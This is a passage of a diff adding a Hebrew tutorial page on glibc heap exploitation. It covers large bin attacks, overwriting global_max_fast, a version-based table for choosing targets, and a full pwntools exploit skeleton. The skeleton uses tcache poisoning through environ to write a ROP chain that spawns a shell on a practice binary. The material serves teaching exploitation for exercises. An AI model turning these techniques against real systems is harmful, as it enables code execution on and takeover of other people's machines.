+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="n">trigger_exit</span><span class="p">()</span>
+</code></pre></div>
+<p>המטרה הזו טובה כשיש לנו דרך לדלוף או לאפס את ה-guard. אם אין, house of apple2 (מטרה 2) עדיפה כי היא לא נתקלת ב-PTR_MANGLE כלל.</p>
+<h2 id="4-large-bin">מטרה 4 - תקיפת large bin לכתיבה מבוקרת<a class="headerlink" href="#4-large-bin" title="Permanent link">&para;</a></h2>
+<p>עד עכשיו הנחנו שיש לנו כתיבה שרירותית מוכנה. תקיפת ה-large bin נותנת פרימיטיב נוסף וחשוב: כתיבה של <strong>כתובת heap שאנחנו שולטים בה</strong> לכתובת שרירותית. היא exploits את הקוד ב-<code>_int_malloc</code> שמכניס chunk ל-large bin ומעדכן את רשימת הדילוגים <code>fd_nextsize</code>/<code>bk_nextsize</code> בלי אימות מלא.</p>
+<p>התסריט: משחררים chunk גדול <code>p1</code> (מעל 0x410, כך שילך ל-unsorted ולא ל-tcache), מקצים משהו גדול יותר כדי לדחוף אותו ל-large bin. עכשיו יש לנו UAF על <code>p1</code> ב-large bin. משחררים chunk גדול שני <code>p2</code>, מעט <strong>קטן</strong> מ-<code>p1</code>. כשהוא נכנס, glibc מבצע בין השאר:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">victim</span><span class="p">;</span><span class="w">   </span><span class="c1">// &lt;-- the write we hijack</span>
+</code></pre></div>
+<p>אם דרסנו את <code>p1-&gt;bk_nextsize</code> לערך <code>target - 0x20</code> (0x20 הוא ההיסט של <code>fd_nextsize</code>), אז השורה השנייה כותבת את כתובת <code>p2</code> לתוך <code>target</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>before:                                after inserting p2:
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>p1-&gt;bk_nextsize = target - 0x20  ---&gt;  *(target) = &amp;p2   (heap address)
+</code></pre></div>
+<p>קיבלנו כתיבה של 8 בתים (כתובת heap, שהיא מספר גדול) לכתובת שבחרנו. לבד זה לא RCE, אבל זה בדיוק מה שצריך כדי להתניע מטרות אחרות: לדרוס <code>_IO_list_all</code> כך שיצביע ל-chunk שלנו (ומשם house of orange / FSOP), או לדרוס את <code>global_max_fast</code> (מטרה 5). תקיפת large bin שרדה עם התאמות קלות עד glibc 2.35, ולכן היא כלי מפתח כשאין UAF נוח על chunk קטן.</p>
+<h2 id="5-global_max_fast">מטרה 5 - הגדלת global_max_fast<a class="headerlink" href="#5-global_max_fast" title="Permanent link">&para;</a></h2>
+<p><code>global_max_fast</code> הוא משתנה גלובלי ב-libc שקובע מהו הגודל המקסימלי שנחשב fastbin. כברירת מחדל הוא קטן (בערך 0x80). מה קורה אם נדרוס אותו בערך ענק, למשל כתובת heap שקיבלנו מתקיפת large bin? פתאום <strong>כמעט כל גודל</strong> של chunk נחשב fastbin. זה פותח מחדש את כל משפחת תקיפות ה-fastbin, אבל עכשיו על גדלים שרירותיים.</p>
+<p>הכוח בזה: fastbin משתמש ברשימת bins שממופה לפי גודל ה-chunk. אם כל גודל הוא fastbin, אנחנו יכולים לזייף chunk ב-<code>fd</code> שמצביע קרוב למבנה <code>main_arena</code> או ל-libc, לשחרר אותו, ולגרום ל-fastbin להצביע לכתובת שנבחר. malloc באותו גודל יחזיר לנו chunk בלב libc. זו הופכת את הכתיבה החד-פעמית של תקיפת large bin לכתיבה שרירותית כללית.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>before:  global_max_fast = 0x80   -&gt; only small chunks are fastbins
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>after:  global_max_fast = 0x5555... (a huge heap address)
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>       -&gt; freeing a chunk of any size -&gt; goes into a fastbin
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>       -&gt; fastbin poisoning on large sizes -&gt; alloc anywhere
+</code></pre></div>
+<p>בפועל global_max_fast היא מטרת ביניים - אף אחד לא דורס אותה כדי לקבל shell ישירות, אלא כדי לפתוח פרימיטיב חזק יותר. שווה להכיר אותה כי היא מופיעה הרבה בchains exploit ארוכות, במיוחד כשהחולשה נותנת רק גדלים גדולים.</p>
+<h2 id="-">איך בוחרים מטרה - טבלת החלטה לפי גרסה<a class="headerlink" href="#-" title="Permanent link">&para;</a></h2>
+<p>אין מטרה אחת נכונה. הבחירה תלויה בגרסת glibc, בסוג החולשה, ובמה כבר leaked. הנה מפה מעשית:</p>
+<table>
+<thead>
+<tr>
+<th>גרסת glibc</th>
+<th>הוקים?</th>
+<th>מטרה מומלצת ראשונה</th>
+<th>מטרה חלופית</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2.27 - 2.31</td>
+<td>קיימים</td>
+<td><code>__free_hook = system</code></td>
+<td>environ -&gt; ROP</td>
+</tr>
+<tr>
+<td>2.32 - 2.33</td>
+<td>קיימים (עם safe-linking ב-tcache)</td>
+<td><code>__free_hook = system</code></td>
+<td>environ -&gt; ROP</td>
+</tr>
+<tr>
+<td>2.34</td>
+<td>הוסרו</td>
+<td>environ -&gt; ROP</td>
+<td>house of apple2</td>
+</tr>
+<tr>
+<td>2.35 - 2.39</td>
+<td>הוסרו</td>
+<td>house of apple2 / environ -&gt; ROP</td>
+<td>__exit_funcs (אם leaked guard)</td>
+</tr>
+</tbody>
+</table>
+<p>כמה כללי אצבע:<br />
+- אם יש UAF/כתיבה נוחים ואתם על 2.31 ומטה: לכו על <code>__free_hook</code>, אל תסבכו.<br />
+- אם אתם על 2.34+ ויש <code>view</code> שנותן leak מחסנית או ש-environ נגיש: environ -&gt; ROP הכי אמין ופחות תלוי בפרטי libc.<br />
+- אם היציאה מהתוכנית מובטחת (<code>exit</code> או <code>return מ-main</code>) ואין לכם מחסנית לכתוב עליה: house of apple2 דרך <code>_IO_list_all</code>.<br />
+- אם החולשה נותנת רק chunks גדולים: תקיפת large bin -&gt; global_max_fast -&gt; fastbin arbitrary write, ומשם לאחת המטרות למעלה.</p>
+<h2 id="exploit-tcache-poisoning-environ">שלד exploit מלא - tcache poisoning אל environ<a class="headerlink" href="#exploit-tcache-poisoning-environ" title="Permanent link">&para;</a></h2>
+<p>נסגור עם שלד מלא ורץ שמדגים את המסלול הכי אמין למות ההוקים: tcache poisoning על 2.31+ שמוביל לכתיבת ROP למחסנית דרך <code>environ</code>. השלד מניח binary עם תפריט heap (add/edit/view/delete) עם UAF, כמו שנבנה בתרגול.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./notes&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./notes&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="k">def</span><span class="w"> </span><span class="nf">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">sz</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>   <span class="o">...</span>   <span class="c1"># trigger the menu operations</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="k">def</span><span class="w"> </span><span class="nf">edit</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>      <span class="o">...</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="k">def</span><span class="w"> </span><span class="nf">view</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>            <span class="o">...</span>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="k">def</span><span class="w"> </span><span class="nf">delete</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>          <span class="o">...</span>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="n">SAFE_LINKING</span> <span class="o">=</span> <span class="kc">True</span>    <span class="c1"># True for 2.32+, False for 2.31 and below</span>
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">mangle</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">ptr</span><span class="p">):</span>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>    <span class="k">return</span> <span class="p">(</span><span class="n">ptr</span> <span class="o">^</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))</span> <span class="k">if</span> <span class="n">SAFE_LINKING</span> <span class="k">else</span> <span class="n">ptr</span>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a><span class="c1"># --- Stage 1: libc leak via unsorted bin ---</span>
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a><span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">)</span>                 <span class="c1"># large chunk (above tcache max)</span>
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a><span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;guard&#39;</span><span class="p">)</span>              <span class="c1"># prevents merging with top</span>
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                            <span class="c1"># -&gt; unsorted bin, fd/bk point to main_arena</span>
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a><span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a><span class="n">main_arena</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">main_arena</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">96</span><span class="p">)</span>
+<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;libc base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>
+<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a><span class="c1"># --- Stage 2: heap leak (needed for safe-linking) ---</span>
+<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a><span class="n">add</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a><span class="n">add</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                 <span class="c1"># both to tcache 0x30</span>
+<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a><span class="n">view</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>                              <span class="c1"># the head&#39;s fd is masked: heap&gt;&gt;12</span>
+<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a><span class="n">heap</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;heap base: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>
+<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a><span class="c1"># --- Stage 3: first poisoning - allocate over environ and read the stack address ---</span>
+<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a><span class="n">add</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a><span class="n">add</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;E&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a><span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">);</span> <span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a><span class="n">chunk5</span> <span class="o">=</span> <span class="n">heap_addr_of</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>             <span class="c1"># address of the chunk at idx 5 (from gdb/calculation)</span>
+<a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a><span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">chunk5</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">])))</span>
+<a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a><span class="n">add</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;X&#39;</span><span class="p">)</span>                   <span class="c1"># pops out 5</span>
+<a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a><span class="n">add</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>              <span class="c1"># returned over environ</span>
+<a id="__codelineno-14-41" name="__codelineno-14-41" href="#__codelineno-14-41"></a><span class="n">view</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
+<a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a><span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a><span class="n">ret_addr</span> <span class="o">=</span> <span class="n">stack_leak</span> <span class="o">-</span> <span class="mh">0x120</span>        <span class="c1"># delta measured once in gdb</span>
+<a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;saved RIP at: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-45" name="__codelineno-14-45" href="#__codelineno-14-45"></a>
+<a id="__codelineno-14-46" name="__codelineno-14-46" href="#__codelineno-14-46"></a><span class="c1"># --- Stage 4: second poisoning - allocate over the saved RIP and write ROP ---</span>
+<a id="__codelineno-14-47" name="__codelineno-14-47" href="#__codelineno-14-47"></a><span class="n">add</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-48" name="__codelineno-14-48" href="#__codelineno-14-48"></a><span class="n">add</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;G&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-49" name="__codelineno-14-49" href="#__codelineno-14-49"></a><span class="n">delete</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="n">delete</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+<a id="__codelineno-14-50" name="__codelineno-14-50" href="#__codelineno-14-50"></a><span class="n">chunk9</span> <span class="o">=</span> <span class="n">heap_addr_of</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>
+<a id="__codelineno-14-51" name="__codelineno-14-51" href="#__codelineno-14-51"></a><span class="n">edit</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">mangle</span><span class="p">(</span><span class="n">chunk9</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)))</span>
+<a id="__codelineno-14-52" name="__codelineno-14-52" href="#__codelineno-14-52"></a><span class="n">add</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;Y&#39;</span><span class="p">)</span>
+<a id="__codelineno-14-53" name="__codelineno-14-53" href="#__codelineno-14-53"></a><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<a id="__codelineno-14-54" name="__codelineno-14-54" href="#__codelineno-14-54"></a><span class="n">chain</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
+<a id="__codelineno-14-55" name="__codelineno-14-55" href="#__codelineno-14-55"></a>    <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">],</span>
+<a id="__codelineno-14-56" name="__codelineno-14-56" href="#__codelineno-14-56"></a>    <span class="n">rop</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">])[</span><span class="mi">0</span><span class="p">],</span>
+<a id="__codelineno-14-57" name="__codelineno-14-57" href="#__codelineno-14-57"></a>    <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)),</span>
+<a id="__codelineno-14-58" name="__codelineno-14-58" href="#__codelineno-14-58"></a>    <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">],</span>
+<a id="__codelineno-14-59" name="__codelineno-14-59" href="#__codelineno-14-59"></a><span class="p">)</span>
+<a id="__codelineno-14-60" name="__codelineno-14-60" href="#__codelineno-14-60"></a><span class="n">add</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">chain</span><span class="p">)</span>                 <span class="c1"># written over the saved RIP -&gt; shell when the function returns</span>
+<a id="__codelineno-14-61" name="__codelineno-14-61" href="#__codelineno-14-61"></a>
+<a id="__codelineno-14-62" name="__codelineno-14-62" href="#__codelineno-14-62"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>הכל כאן נשען רק על דברים שקבועים בין הרצות: offsets בתוך libc (<code>environ</code>, <code>system</code>), ה-<code>delta</code> שבין environ ל-saved RIP, וההתנהגות הבסיסית של tcache. שום דבר לא נשען על ההוקים. לכן זה המסלול שיעבוד לכם על הגרסאות החדשות.</p>
+<h2 id="_1">סיכום<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li>אחרי tcache poisoning יש לנו כתיבה שרירותית, אבל השאלה האמיתית היא <strong>על מה כותבים</strong> כדי לקבל הרצת קוד.</li>
+<li><code>__free_hook</code>/<code>__malloc_hook</code> היו המטרה הקלה עד 2.33, ו<strong>נמחקו ב-2.34</strong>. מאז צריך ארסנל מטרות.</li>
+<li>מטרה 1 - environ: קוראים כתובת מחסנית, כותבים chain ROP על saved RIP. אמין ובלתי תלוי בגרסה.</li>
+<li>מטרה 2 - FSOP: מזייפים <code>_IO_FILE</code>. לleak - <code>_IO_2_1_stdout_</code>. ל-RCE על 2.34+ - house of apple2 דרך <code>_IO_wfile_jumps</code> וה-<code>_wide_vtable</code> שלא נבדק.</li>
+<li>מטרה 3 - __exit_funcs: מצביעי היציאה מעורבבים ב-PTR_MANGLE, צריך לדלוף או לאפס את ה-pointer guard.</li>
+<li>מטרה 4 - large bin attack: כתיבת כתובת heap מבוקרת לכתובת שרירותית, מתניעה מטרות אחרות.</li>
+<li>מטרה 5 - global_max_fast: הופכת כל גודל ל-fastbin ופותחת מחדש fastbin arbitrary write.</li>
+<li>בחירת המטרה תלויה בגרסה, בחולשה, ובמה leaked. תמיד תתחילו מהמסלול הפשוט ביותר שהגרסה מאפשרת.</li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="עדכון אחרון">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime" title="15 ביולי 2026 19:14:25 UTC">2026-07-15 19:14:25</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  חזרה למעלה
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.top", "navigation.prune", "navigation.path", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u05d4\u05d5\u05e2\u05ea\u05e7 \u05dc\u05dc\u05d5\u05d7", "clipboard.copy": "\u05d4\u05e2\u05ea\u05e7\u05d4 \u05dc\u05dc\u05d5\u05d7", "search.result.more.one": "\u05e2\u05d5\u05d3 \u05d0\u05d7\u05d3 \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.more.other": "\u05e2\u05d5\u05d3 # \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.none": "\u05d0\u05d9\u05df \u05de\u05e1\u05de\u05db\u05d9\u05dd \u05ea\u05d5\u05d0\u05de\u05d9\u05dd", "search.result.one": "\u05de\u05e1\u05de\u05da1 \u05ea\u05d5\u05d0\u05dd", "search.result.other": "# \u05de\u05e1\u05de\u05da \u05ea\u05d5\u05d0\u05dd", "search.result.placeholder": "\u05d9\u05e9 \u05dc\u05d4\u05e7\u05dc\u05d9\u05d3 \u05db\u05d3\u05d9 \u05dc\u05d4\u05ea\u05d7\u05d9\u05dc \u05dc\u05d7\u05e4\u05e9", "search.result.term.missing": "\u05d7\u05e1\u05e8", "select.version": "\u05d1\u05d7\u05d9\u05e8\u05ea \u05d2\u05e8\u05e1\u05d4"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../javascripts/progress.js"></script>
+      
+        <script src="../../../../javascripts/tabs-dropdown.js"></script>
+      
+        <script src="../../../../javascripts/theme-switcher.js"></script>
+      
+        <script src="../../../../javascripts/recent-posts.js"></script>
+      
+    
+  </body>
+</html>
